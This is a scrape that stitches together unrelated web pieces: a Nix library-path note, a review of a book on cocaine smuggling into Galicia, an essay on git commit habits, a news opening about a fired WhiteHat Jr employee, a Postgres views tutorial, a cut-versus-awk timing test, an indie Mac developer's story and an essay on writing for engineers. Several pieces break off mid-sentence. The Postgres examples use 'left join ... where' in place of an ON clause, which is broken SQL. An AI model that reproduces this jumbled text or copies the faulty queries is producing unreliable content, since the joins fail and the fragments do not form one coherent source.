<p>The packages can be realized on-demand onto the host and their <em>/nix/store</em> entry can then be included into the <em>LD_LIBRARY_PATH</em> environment variable set when handing off to the <em>real ld</em>.</p>

<blockquote>
  <p>If gc-roots are set for the required libraries, this determination can then be cached for a given binary.</p>
</blockquote>

<p>Fancier best-effort matching on picking packages that have the highest % of required symbols could also be done.</p>

<p>It seems kind of crazy that just picking random packages from the <em>nix-index</em> would ultimately let us run the binary; except that is how traditional software in Linux normally works! 😱</p>

<p>At worst it is providing the same experience users typically experience on non-NixOS distributions but giving a gentler onboarding for people as they see the Nix-light 😇</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-00c327a0e80805b65a15"><div><p>At the beginning of Alfred W. McCoy’s seminal work on the global heroin trade and the CIA, <em>The Politics of Heroin</em>, he gives us a simple formulation that’s useful for any study of illicit drugs and their trade: ‘Narcotics are not simply illegal and immoral,’ he writes. ‘They are the source of extraordinary profits and power.’ Part of the power of McCoy’s book is that he writes about his subject so thoughtfully, and eschews the sensationalism that characterizes too much writing about drugs and their traffic. ‘Simply put, narcotics are major global commodities that resist any attempt at localized suppression… As long as demand for drugs in the cities of the First World continues to grow, Third World producers will find a way to supply their markets.’</p><p>Nacho Carretero’s <em>Snow on The Atlantic, How Cocaine Came to Europe</em>, published in a translation by Thomas Bunstead in 2018 by Zed Books, is a contribution to telling the story of one of these global commodities: cocaine. It tells a tale of Galicia and its Costa Del Morte, that region in Spain sitting on top of Portugal with 930 deadly miles of coastline and an adventurous history of shipwrecks and pirates and smuggling. This book focuses on the colorful tale of how Galicia became the port for cocaine smuggling in Europe, largely through an alliance between the Medellín Cartel in Colombia and a homegrown smuggling culture and network of clans. It’s packed with characters and schemes and police operations, but one flaw is that it falls into their sensationalism too often (a <a href="https://www.antena3.com/series/farina/">popular television series</a> in Spain was based on the book), and its major failing is in not making much of an attempt to analyze the phenomenon more deeply. The details in the book, however, make great raw material for a more developed analysis down the line.</p><p>Here is a sketch of the story that Carretero tells: it begins in earnest after the Spanish Civil War, in that inter-border region between Spain and Portugal called the <em>Couto Mixto</em>. Carretero goes as far as to say the area is characterized by a ‘statelessness.’ Not so long ago, as recently as the nineteenth century, if you asked villagers in the area what country they were citizens of they couldn’t tell you. The Spanish Civil War defined these borders. And those borders made nations become as classes; the living standard in Portugal was high, while in Spanish Galicia much of the rural inhabitants lived in relative and real poverty. It was the difference, Carretero writes, ‘between one group of people who were starving, and another enjoying the spoils of African colonies.’ This was something I wish Carretero had expanded on: what was the licit economy in Galicia and why did its people live worse? On that he gives no real answer, though he does describe how some local fortunes were made from tungsten sold to the Third Reich during the Second World War.</p><p>Whatever the reasons for this poverty, the relative affluence of Portugal right across the border made Galicia a prime location for smuggling of all sorts of things. It was cigarettes which became the big money maker. Smugglers cut deals with the big guys like Reynolds &amp; Philip Morris in America to move excess production and faulty batches, dodging gargantuan amounts of taxes, and altering the flow of goods from up from Portugal to across the Atlantic. That route would define the traffic later when cocaine started coming from Colombia.&nbsp;</p><p>The law helped too. Until 1982 all you could get for smuggling was a caution. Before 1978 smuggling was only an economic offence. With the Customs Surveillance Service (SVA) enforcing the weak laws, smugglers rarely went to jail – at most they’d get a fine, and that would often be lost in the Minoan bureaucratic system of the new democratic state post-Franco.</p><p>Carretero describes a society where the lumpen ruled each class strata, not just a lumpen-proletariat but a lumpen-petty bourgeois and a lumpen bourgeoisie. ‘There was nothing abnormal about the sight of smugglers and <em>guardias</em> sharing a tumbler of wine over a game of dominos in the local tavern.’ He explains further that smugglers and police would often have agreements that let the smuggling pass unmolested, provided the police got their cut: ‘From the beginning, the relationship with the <em>Guardia Civil </em>was good. Those in the pay of the government were as hard up as everyone else, and it was almost always them who proposed the pacts.’</p><p>Police in on the take isn’t unprecedented or uncommon. More interesting are the connections Carretero details between the smugglers and the political class. When I mention smugglers, I’m referring not just to the later drug traffickers but also the ‘smoke lords’ who developed their expertise and reputation moving cigarettes. They provided the perfect resource for the cartels to exploit later when they saw the talent and culture that existed in Galicia. These mafia-like clans were generous contributors to all political parties in the region, particularly the institutional right-wing parties like the <em>People’s Alliance</em> (AP), which later became the <em>Partido Popular</em> (PP). That party had numerous links to the smugglers, from campaign contributions to friendships, to particularly salient connections through the Galician Chamber of Commerce, of which many smugglers and their associates were members at one time or another. That extended to the auxiliaries of the narcotics trade – lawyers like Pablo Vioque who defended the smugglers in their inevitable run-ins with the law.</p><div><p>How the shift to drug smuggling was made is murky. Someone bought hashish once from Africa and knew one of the <em>Capos</em>. Hashish smuggling quickly became cocaine.</p><p> However it happened, smugglers made the transition quickly. When the Medellín cartel spent some time in Galicia in exile they realized that there was an ideal infrastructure for them to use. They built this trade from the ready-made scaffolding of the tobacco trade. Clan bosses like Sito Miñanco took the speedboats they had running crates of smoke up and down the Arousa river and loaded them with blow.&nbsp;</p></div><p>The Medellín cartel had come to Galica because they were feeling some heat from the DEA in bringing drugs into the U.S. (never if it went at cross measures with the goals of the CIA, of course, as McCoy shows in his book), and they needed new markets. McCoy’s law of narcotics as commodities seeking to be sold held true. Europe in the 80s was the perfect logical next step. Not only did they have the skilled talent they needed, but the Galicians spoke their language. And the government tied its own hands to stop it thanks to their numerous corrupt connections.</p><p>This is the more interesting story that I wish the book had told, as well as delving deeper into the politics of the trade. Why did Galician politicians allow the smuggling culture to take hold? Carretero mentions that a factor in the government finally taking action was the support for interdiction of the trade by Socialist Party (PSOE) politicians, like Felipe González, who was Prime Minister of the country from 1982-1996. It was within this time period that the first blow against the smugglers came, with the ‘macro-indictment’ of 1984. This was the first coordinated strike against the whole of the smugglers and their network, rather than limited and ineffective isolated enforcement. Carretero credits the limited success of this action (nobody went down hard, though it did create a new state of affairs where the smugglers had to tread more cautiously and not so out in the open as they had before) to it having the support of a Virginio Fuentes. Fuentes was the socialist governor of Pontevedra, ‘one of the few in Galician politics to raise his voice against the smugglers.’ Carretero attributes this to Fuentes following the cue of González; he ‘sensed a potential vote-winner in taking a stand against smuggling.’</p><p>But Carretero also mentions a murkier story that would have merited closer scrutiny (or more realistically its own book). He relates an anecdote from Fernando Rodríguez Mondragón’s book <em>El hijo del ‘Ajedrecista’ </em>(The ‘Chess Player's’ Son). That chess player was Gilberto Rodríguez Orejuela, who was the boss of the Cali cartel – the cartel that shipped the cocaine over the Atlantic to Galicia. Orejuela was in Spain following a crackdown in Colombia by the President Belisario Betancur on the narcos, but he had been scooped up in November of ‘84 in Spain along with an account book of his detailing millions of dollars in transactions for the cartel. The DEA wanted Orejuela extradited to America, but after two years of jockeying and negotiation, Orejuela and the Colombians were sent back to Colombia. They spent just months in prison before getting out, while in America they could have expected 10-15-year prison sentences.</p><p>Mondragón says in his book that the reason for these reduced sentences came to Spain on Pablo Escobar’s private jet. And there were twenty million of these reasons. $5 million went to Felipe González, ‘his negotiators said there was an election coming up and they needed the money.’ $10 million went to the <em>Audiencia Nacional</em>, ‘the High Court in Spain with jurisdiction over international crimes.’ Carretero doesn’t dig any deeper into these explosive allegations, wrapping up tersely that ‘these claims remain unsubstantiated.’ But having questions like these answered would go a long way in understanding how exactly the drug trade was tolerated by the Spanish government.&nbsp;</p><p>McCoy notes that ‘the CIA’s Cold War alliances with drug lords ... created enforcement-free zones closed to outside investigation.’ How this worked was simple, ‘the DEA deferred to the CIA during the Cold War whenever covert operations became intertwined in the drug trade…’ Its links to the Medellín cartel, which Pablo Escobar founded, are documented as well. ‘All major U.S. agencies,’ writes McCoy, ‘have gone on the record stating, with varying degrees of frankness, that the Medellín cartel used contra forces to smuggle cocaine into the …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p>I find it challenging to keep commits consistent and perfectly segmented. My original reasoning was a lack of discipline on my end. But over time, I discovered that I am the majority. My new conclusion is it's not me. It's git's fault.</p><p>Human brains function in vastly different ways among the population. Some are logical; some are sensitive, and some are more organised than others. <del>Astrology can explain it all</del>. The two forms of thinking that are related to this topic is <a href="https://en.wikipedia.org/wiki/Divergent_thinking">divergent thinking</a> and <a href="https://en.wikipedia.org/wiki/Convergent_thinking">convergent thinking</a>. If you are more of a divergent thinker, you might find ideas popping up in your head constantly (which is pretty annoying sometimes). That's because your brain works by association more. Input from the world, in the case of writing code, is mostly the existing codebase, combined with your past experiences with previous projects, which will generate ideas of how to solve your current tasks. And ideas will trigger more thoughts in a chaining fashion. That's why I often find myself ending up in a place that's nothing to do with the original task. And it's often too late when I realised that (i.e. progress has been made, but not finished). Sometimes there were multiple jumps. When I finish all the bits I started, that's when the biggest problem of the whole work comes in: writing a commit message. Here is an example of a very common commit message in my works.</p><pre><code>fix issue #45

- add [aaa] support
- improve ergonomics of API [bbb]
- refactor [ccc] to [ddd] so that it fits in the eco-system
- oh, package X just became multiple sub packages, we have an eco-system now</code></pre><div><h2>Solutions and Their Problems</h2><p>I have made numerous attempts to improve the situation. Most of the ideas are from "industry best practices".</p><div><h3>create branches for everything</h3><p>This idea came early. Branching makes sense when you work with other people because you are working in parallel. Merging code and resolve conflicts is worth the effort in that scenario. You get the cost back easily from the progress gain due to parallelisation of your work. But it falls apart when the scope is about you and your thoughts. Yes, you are generating more ideas then you physically can keep up with your code, but you are still single-threaded processor. Merging old branches is not a fun activity.</p></div><div><h3>commit often</h3><p>I mean like very often! It's always a good idea to follow the first principle in any engineering problems. Breaking things down into atomic pieces and commit frequently is a sound solution. You also have the benefit of being able to revert specific changes quickly since they are small(er) and (more) atomic. I tried this for a while. The trick is to build up a habit of recognising boundaries and commit without procrastination. In practice, though, I find myself, more often than I would like to, going back changing the git history just to align with the principle. Maybe I should just accept that nobody is perfect, it's okay to mess things up from time to time. But that really demotivate me to keep doing it. Also, I have to constantly be aware of the situation at hand. That's extra brain energy I don't want to waste during heavy works.</p></div></div><div><h2>My Current Solution</h2><p>It's not a solution per se; it's more of a compromise. (Well, isn't that the nature of life 😉?) Or you can say I don't have a solution yet, and I am getting by with it.</p><div><h3>breaking things down (or I try to)</h3><p>I try to break things down to manageable size and commit as soon as the progress is granular. Sometimes it might be an entirely different task I was set out to do because of my divergent thinking nature.</p></div><div><h3>keep track of everthing going on in my brain efficiently</h3><p>I use one <a href="https://orgmode.org/">org-mode</a> file (it's a plain text format for keeping notes and todo lists, you can use whatever works for you, even multiple apps) per project to document my thoughts, ideas, review them regularly, transform them into tasks, and document the progress. I try to keep the file with the repo, but sometimes I don't necessarily want to share my thought process with others, say a work-related repo, or an open-source one. Then it goes into my own knowledge base.</p></div><div><h3>be stingy about branching</h3><p>I know one of the biggest selling points of git is: branching is cheap. It depends on the reason for branching, as I described above. It is definitely not cheap in solo scenarios. So I only create branches when:</p><ul><li>It's the start of a new era. E.g. orgajs v1.0 -&gt; v2.0. The whole thing will be gutted and refactored to death and brought back to life stronger.</li><li>work with other people, of course.

<p>Shaarif Ansari got the call on 11 November at around 9 in the morning. On the phone was a police officer from Powai police station, in the suburbs of Mumbai. “Ansari please come to the police station,” said the officer. “We have received a complaint from your employer WhiteHat Jr. The company officials are here at the station already. We are waiting for you.”&nbsp;</p>


<p>Ansari was taken aback. It is not everyday that you have a police officer call you. Almost immediately he clarified that he did not work at WhiteHat Jr anymore. That he was fired by the company in the first week of September and had had no contact with them since, so what was all this about? The person was in no mood to explain or chat. He cut Ansari off, and asked him to turn up at the station immediately. Caught completely by surprise and with no idea about what was in store for him, Ansari said he was on his way.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>A quick summary of Postgres views, materialized views, and why you should use them.</p><h3>What is a View?</h3><p>A <a href="https://www.postgresql.org/docs/12/sql-createview.html" target="_blank" rel="noopener noreferrer">view</a> is a convenient shortcut to a query. Creating a view does not involve new tables or data. When run, an underlying query is executed, returning its results to the user.</p><h4>Basic Example</h4><p>Say we have the following tables from a database of a university:</p><p><strong>students</strong></p><table><thead><tr><th>id</th><th>name</th><th>type</th></tr></thead><tbody><tr><td>1</td><td>Arun</td><td>undergraduate</td></tr><tr><td>2</td><td>Zack</td><td>graduate</td></tr><tr><td>3</td><td>Joy</td><td>graduate</td></tr></tbody></table><p><strong>courses</strong></p><table><thead><tr><th>id</th><th>title</th><th>code</th></tr></thead><tbody><tr><td>1</td><td>Introduction to Postgres</td><td>PG101</td></tr><tr><td>2</td><td>Authentication Theories</td><td>AUTH205</td></tr><tr><td>3</td><td>Fundamentals of Supabase</td><td>SUP412</td></tr></tbody></table><p><strong>grades</strong></p><table><thead><tr><th>id</th><th>student_id</th><th>course_id</th><th>result</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>B+</td></tr><tr><td>2</td><td>1</td><td>3</td><td>A+</td></tr><tr><td>3</td><td>2</td><td>2</td><td>A</td></tr><tr><td>4</td><td>3</td><td>1</td><td>A-</td></tr><tr><td>5</td><td>3</td><td>2</td><td>A</td></tr><tr><td>6</td><td>3</td><td>3</td><td>B-</td></tr></tbody></table><p>Creating a view consisting of all the three tables will look like this:</p><div><div><div><div><p><span>create</span><span> </span><span>view</span><span> transcripts </span><span>as</span><span></span></p><p><span>    </span><span>select</span><span></span></p><p><span>        students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>        students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>        grades</span><span>.</span><span>result</span></p><p><span>    </span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>Once done, we can now access the underlying query with:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>For additional parameters or options, refer <a href="https://www.postgresql.org/docs/12/sql-createview.html#:~:text=parameters" target="_blank" rel="noopener noreferrer">here</a>.</p><h3>Why should we use Views?</h3><p>Views provide the several benefits:</p><ul><li>Simplicity</li><li>Consistency</li><li>Logical Organization</li><li>Security</li></ul><h4>Simplicity</h4><p>As a query becomes complex it becomes a hassle to call it. Especially when we run it at regularly. In the example above, instead of repeatedly running:</p><div><div><div><div><p><span>select</span><span></span></p><p><span>    students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>    students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>    grades</span><span>.</span><span>result</span></p><p><span></span><span>from</span><span> grades</span></p><p><span></span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span></span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>We can run this instead:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>Additionally, a view behaves like a typical table. We can safely use it in table <code>JOIN</code>s or even create new views using existing views.</p><h4>Consistency</h4><p>Views ensure that the likelihood of mistakes decreases when repeatedly executing a query. In our example above, we may decide that we want to exclude the course <em>Introduction to Postgres</em>. The query would become:</p><div><div><div><div><p><span>select</span><span></span></p><p><span>    students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>    students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>    grades</span><span>.</span><span>result</span></p><p><span></span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span></p><p><span></span><span>where</span><span> courses</span><span>.</span><span>code </span><span>!=</span><span> </span><span>'PG101'</span><span>;</span></p></div></div></div></div><p>Without a view, we would need to go into every dependent query to add the new rule. This would increase in the likelihood of errors and inconsistencies, as well as introducing a lot of effort for a developer. With views, we can alter just the underlying query in the view <strong>transcripts</strong>. The change will be applied to all applications using this view.</p><h4>Logical Organization</h4><p>With views, we can give our query a name. This is extremely useful for teams working with the same database. Instead of guessing what a query is supposed to do, a well-named view can easily explain it. For example, by looking at the name of the view <strong>transcripts</strong>, we can infer that the underlying query might involve the <strong>students</strong>, <strong>courses</strong>, and <strong>grades</strong> tables.</p><h4>Security</h4><p>Views can restrict the amount and type of data presented to a user. Instead of allowing a user direct access to a set of tables, we provide them a view instead. We can prevent them from reading sensitive columns by excluding them from the underlying query.</p><h3>What is a Materialized View?</h3><p>A <a href="https://www.postgresql.org/docs/12/rules-materializedviews.html" target="_blank" rel="noopener noreferrer">materialized view</a> is a form of view but with the added feature of physically storing the results. In subsequent reads of a materialized view, the time taken to return its results would be much faster than a conventional view. This is because the data is readily available for a materialized view while the conventional view executes the underlying query each time it is called.</p><h4>Basic Example</h4><p>Using our example above, a materialized view can be created like this:</p><div><div><div><div><p><span>create</span><span> materialized </span><span>view</span><span> transcripts </span><span>as</span><span></span></p><p><span>    </span><span>select</span><span></span></p><p><span>        students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>        students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>        grades</span><span>.</span><span>result</span></p><p><span>    </span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>Reading from the materialized view is the same as a conventional view:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>For additional parameters or options, refer <a href="https://www.postgresql.org/docs/12/sql-creatematerializedview.html#:~:text=parameters" target="_blank" rel="noopener noreferrer">here</a>.</p><h4>Refreshing</h4><p>Unfortunately, there is a trade-off - data in materialized views are not always up to date. We need to refresh it regularly to prevent the data from becoming too stale. To do so:</p><div><div><div><div><p><span>refresh materialized </span><span>view</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>It's up to you how regularly refresh your materialized views, and it's probably different for each view depending on its use-case.</p><h3>Materialized views vs Conventional views</h3><p>Materialized views are useful when execution times for queries or views become unbearable or exceed the service level agreements of a business. These could likely occur in views or queries involving multiple tables and millions of rows. When using such a view, however, there should be tolerance towards data being outdated. Some use-cases for materialized views are internal dashboards and analytics.</p><p>Creating a materialized view is not a solution to inefficient queries. You should always seek to optimize a slow running query even if you are implementing a materialized view.</p><h3>Conclusion</h3><p>Postgres views and materialized views are a great way to organize and view results from commonly used queries. Although similar to one another, each has its purpose. Views simplify the process of running queries. Materialized views are usually faster at returning results, with the trade-off of having stale data.</p></section></div>]]>

<br>
<h3>The UNIX philosophy</h3>

<p>
In UNIX, there is (or used to be) a philosophy which, among other things, 
stipulates that a piece of software should do "one thing well". There is 
of course a long-running debate over not only what this really means, 
but also about whether certain programs - if any at all - still adhere 
to this, or ever did.
</p>

<p>
So, we're allegedly in the middle of a dangerous downward spiral of 
constant feature creep and a growing number of command parameters that 
will, eventually, lead to a Grand Unified Program that does everything
poorly (Depending on your personal preference and current mood, replace
the GUP with systemd, Emacs, Windows or Google Chrome as you see fit).
</p>

<p>
I for one find the concept of the UNIX philosophy of doing one thing 
well amicable. I also realize that it is a product of a time when 
computers still mostly passed around text files, and that those text 
files were considered preposterously huge if they exceeded a couple of 
megs in size. Heck, the modern GUI was still a research project at PARC 
when Doug McIlroy wrote the UNIX philosophy down in 1976.
</p>

<h3>Thinkin' 'bout philosophy</h3>
<p>
So, what does it mean to do one thing and do it well? Well, awk has been
a staple of any UNIX diet since the late 1970s. I think it's a lovely
little tool which I use even for rather mundane tasks. It's certainly
changed a bit over the years, but the core concept of the language
remains the same. Still, it's a complete programming language and
can do a lot more than a simple, single-purpose command.
</p>

<p>
The cut command is slightly newer, but like awk, it's a part of the 
POSIX standard. It can also hardly be considered to have suffered much 
feature creep: it's got a rather stringent set of parameters and really 
does just one thing, which is cutting a smaller piece of text out of a 
larger piece of text.
</p>

<p>
The question is of course, does the UNIX philosophy still hold up? Is it always
better to have one small program doing one thing well, as opposed to a
slightly bigger program doing many things? Let's examine this by performing
a simple task with two slightly different twists.
</p>

<h3>Task number one</h3>

<p>
Task number one was to print the second column of a three-column file with
10,000 rows, with a single space separating the columns. This task was
repeated 100 times.
</p>

<p>
<b>cut (GNU coreutils, 43224 bytes)</b>
</p>
<pre>cat cva_in1 | cut -d ' ' -f 2 &gt; /dev/null

real    0m0.297s
user    0m0.288s
sys     0m0.153s
</pre>

<p>
<b>awk (gawk, 658072 bytes)</b>
</p>
<pre>cat cva_in1 | awk '{print $2}' &gt; /dev/null

real    0m0.818s
user    0m0.754s
sys     0m0.232s
</pre>

<p>
<b>Python 3 (Python 3.6, 4526456 bytes + libraries)</b>
<br>
My go-to language for farting around with programming ideas, thus
included for reference. The below two lines of code were written to
a script through which the input was piped and, just as above,
redirected to /dev/null:
</p>
<pre>import sys
for l in sys.stdin: print(l.split()[1])

real    0m5.423s
user    0m4.753s
sys     0m0.873s
</pre>

<p>
As is clearly evident from this highly scientific performance test,
cut is by far the fastest tool for the job. I tried a few different
approaches with Python (such as opening the file from the script
instead of piping it), but they were all similarly slow.
</p>

<h3>Task number two</h3>

<p>
This time, things were spiced up by printing the fifth column in a file 
with unevenly-spaced columns, using the output from "ls -l". The file 
used for testing contained 2235 lines. This task was also repeated 100 
times. Since cut doesn't quite cope with this uneven spacing, we had to 
put the magic of the UNIX philosophy to work using pipes: this time, tr 
was involved as well, stripping away spaces to make each row 
understandable to cut.
</p>

<p>

Despite the extra pipe, it seems the UNIX philosophy comes out

<h3>A few notes</h3>
<p>
This is of course not an exhaustive test and proves little, if anything 
at all, about he UNIX philosophy. I just wanted to perform a simple test 
with a scenario that at least I have come across many different 
times in many different scripts and many different languages.
</p>

<p>
In a typical daily scenario, I would personally have picked awk for task 
two and saved myself a bit of typing and figuring. This would have made 
no significant impact on perceived performance, because I usually don't 
deal with very large files and in most cases, the time I spend with 
tools I'm less comfortable with far exceeds the time I then spend 
waiting for the script. Still: based on nothing but gut feeling, I 
actually expected awk to be faster or at least comparable for task two. 
So much for my gut.
</p>

<p>
For coping with more complex scenarios without resorting to a language 
proper, more pipes will have to be added and more command line utilities 
will have to be invoked if we want to keep on using tools compliant with 
the UNIX philosophy. This can likely lead to worse performance, but this 
test just goes to show (for the umpteenth time) that the tool we 
instinctively reach for to tackle a task might not be the right one.

<p>Why did it take so long, couple little nuggets here to chew on for fellow hashnoders.</p>
<h2 id="2014">2014</h2>
<p>Apple released Swift, thought it was cool and set out to build first apps. </p>
<p>I wanted to build games to build something fun so I created a couple different card games for the iPad and also a novel puzzler for iOS. </p>
<p>I had <strong>zero knowledge of marketing</strong>, didn't really think about <strong>WHY</strong> the large global markets would be interested in obscure Finnish card games and overall just did a real rookie job.</p>
<p>I was a decent coder, but I think that's pretty much where it started and ended.</p>
<h2 id="2015-2016">2015-2016</h2>
<p>Not too much activity, kept tinkering with a number of projects but didn't release new significant stuff. </p>
<p>Didn't count the non-published projects that were taken quite far but I'm sure there was many. </p>
<p>What can be learned here? <strong>You can't win if you don't play the game.</strong></p>
<h2 id="2017-2018">2017-2018</h2>
<p>This was the first time I started to see more traction. There were two reasons why this happened.</p>
<ol>
<li><p>I created a couple of games that already had audience (Klondike, Spider and Freecell Solitaire). Games that many people love and will always look to find for their new HW. <strong>In short, launching something with a pre-existing demand</strong>.</p>
</li>
<li><p>I started primarily focusing on the MacOS market. The iOS simple games market is incredible competitive. There are big studios there that pour in big bucks to make really refined experiences and make the games freemium. It's really hard in that environment to be discovered or sell your games for a few bucks. But in the Mac App Store this was possible. In other words, <strong>finding a market with less competition and easier discoverability</strong>.</p>
</li>
</ol>
<p>Still didn't really spend that much time on indie hacking, community building, marketing in general or much else. Just built a few games, put 'em out there and tried to make sure most gamers would be happy with them.</p>
<h2 id="2019">2019</h2>
<p>Quite suddenly and unexpectedly my sales made a huge jump in Q4 2019. Without releasing anything new. What happened? </p>
<p>Apple released macOS Catalina that would not run 32-bit apps anymore. </p>
<p>This meant that <strong>they erased much of the competition</strong> for the card games and all of a sudden more people were looking for these games and had less options to choose from. One would rather excel due to their own great products, but everything counts, right?</p>
<p>At the same time I also knew that I really had to create more something totally different, was simply not interested to put too much effort into this genre anymore.</p>
<h2 id="2020">2020</h2>
<p>The year obviously went haywire from the start and under quarantine I had a chance to finalise and release an app into a totally new genre - productivity. </p>
<p>I created a pretty simple Mac utility  <a target="_blank" href="https://owlocr.com/">OwlOCR</a> and for the first time tried to release in a more sensible way. I published some posts in r/macapps and got phenomenal feedback that really helped improve the app. Super thankful to these early users.</p>
<p>I then launched PH and got a lot of downloads, but less direct feedback. At this point app was still free as I wanted to get some footprint first. </p>
<p>After a few months of totally free, I introduced a premium in-app tier to help with further development. Sales of this tier have been pretty steady and there hasn't been too much negative backlash, as I've kept most features free for all.</p>
<p>This was the first app where I put more effort into the webpage and release efforts, I think next ones should easier as I know a bit more again how to play it.</p>
<p>There's still waaaaayyyyy long way to go before this could be primary source of bread and butter, but the last year has given at least kind of a glimpse of that. </p>
<p>I'm afraid I might need to pivot away from the Mac App Store however, as it opens to iOS apps in the future. At that point I'm afraid it will become as convoluted with big player apps that the indies will be pushed to the sidelines.</p>

<section id="mc_embed_signup">

</section>
<p>I’ve been thinking a lot about writing lately. I recently <a href="https://www.karllhughes.com/posts/cto-writer">left a career as a startup CTO to write full-time</a>, so when people ask me things like, “Why should software engineers know how to write?” I have a lot of thoughts. Rather than write yet another listicle (<a href="https://www.thegraidenetwork.com/blog-all/2017/10/3/why-math-and-science-students-need-writing">1</a>, <a href="https://benmccormick.org/2019/03/02/the-importance-of-writing">2</a>, <a href="https://www.freecodecamp.org/news/why-developers-should-know-how-to-write-dc35aa9b71ab/">3</a>, <a href="https://www.tiny.cloud/blog/developer-blog-writing-social-networks/">4</a>), I am going to boil it down to one simple reason:</p>
<p><strong>You should write to increase your level of influence.</strong></p>
<h2 id="why-influence-matters">Why Influence Matters</h2>
<p>Whether you strive to be promoted within your organization or be fawned over by the coolest tech companies, the fastest path to success is making the right people aware of you. In one of the best essays of career advice for programmers, Patrick McKenzie points out:</p>
<blockquote>
<p>“Most jobs are never available publicly, just like most worthwhile candidates are not available publicly. Information about the position travels at approximately the speed of beer, sometimes lubricated by email.” - <a href="https://www.kalzumeus.com/2011/10/28/dont-call-yourself-a-programmer/">Patrick McKenzie, Don’t Call Yourself a Programmer</a></p>
</blockquote>
<p>Unfortunately, just being the “best” programmer around isn’t going to get you talked about in a bar (and <a href="https://blog.newrelic.com/technology/good-computer-programmer-criteria/">it’s subjective anyway</a>). Ben McCormick points out:</p>
<blockquote>
<p>“Once somebody hits a minimum threshold of technical skill to hold a job in the industry, about 80% of their ability to succeed in Software Development is determined by their communication and people skills, not their technical abilities.” - <a href="https://benmccormick.org/2019/03/02/the-importance-of-writing">Ben McCormick</a></p>
</blockquote>
<p>My experience supports Patrick’s and Ben’s assertions, so now the question is, how can you become one of the people whose name comes up before a job is publicly available?</p>
<p><strong>The right people have to know you. You have to have the right kind of influence.</strong></p>
<h2 id="levels-of-writing-influence">Levels of Writing Influence</h2>
<blockquote>
<p>“The difference between a tolerable programmer and a great programmer is not how many programming languages they know…It’s whether they can communicate their ideas. By persuading other people, they get leverage.” - <a href="https://www.joelonsoftware.com/2005/01/02/advice-for-computer-science-college-students/">Joel Spolsky</a>, Co-founder of StackOverflow</p>
</blockquote>
<p>If you buy my assertion that influence is important in your career as a software developer, the next step is for me to convince you that writing will actually increase your influence. In fact, not all writing will work. The kind of writing you do will make a massive difference on the level and kind of influence you gain.</p>
<p><img src="https://i.imgur.com/KwA6AQe.jpg" alt=""></p>
<p>Let’s take a look at the different levels of influence you can achieve as a software developer and the kinds of writing you need to do to achieve them.</p>
<h3 id="1-willing-participant">1. Willing Participant</h3>
<p>Participants are not influential. They don’t realize it, but they have very little control over their career and are likely to go through a period of unemployment and grueling job interviews every time they need a new job. The only writing a Willing Participant will do is what’s required of them: they’ll respond to Slack messages and emails; they’ll dutifully enter their progress report every day; they might leave a sticky note on someone’s desk (or the digital equivalent) when they want to have a protracted discussion about an issue.</p>
<p>If this is you, don’t be discouraged. We all start our careers as Willing Participants. With <a href="https://www.prnewswire.com/news-releases/harness-2020-state-of-developer-satisfaction-report-shows-impact-of-coronavirus-on-software-development-301119564.html">most software engineering jobs staying remote for the foreseeable future</a>, the minimum level of writing ability is likely to increase, but just checking the box isn’t going to put your name on the tip of your next boss’ tongue.</p>
<h3 id="2-organizational-teacher">2. Organizational Teacher</h3>
<blockquote>
